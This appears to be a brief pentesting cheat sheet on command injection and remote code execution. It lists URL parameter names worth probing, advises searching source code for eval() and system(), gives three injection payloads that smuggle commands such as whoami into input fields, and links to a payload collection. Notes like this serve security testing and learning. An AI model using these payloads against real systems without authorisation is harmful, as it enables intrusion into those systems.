# Remote Code Execution & Command Injection :
`occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration`

### Common parameters :

```
?cmd=
?exec=
?command=
?execute=
?ping=
?query=
?jump=
?code=
?reg=
?do=
?func=
?arg=
?option=
?load=
?process=
?step=
?read=
?function=
?req=
?feature=
?exe=
?module=
?payload=
?run=
?print=

```
### Source Code Review :
search in the source code keywords like `eval()` , `system()` ...etc 

### Portswiger payloads :
```
|whoami
||whoami>/var/www/images/test.txt||
||ping+-c10+127.0.0.1||
```

### Payloads :
> Visit [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)





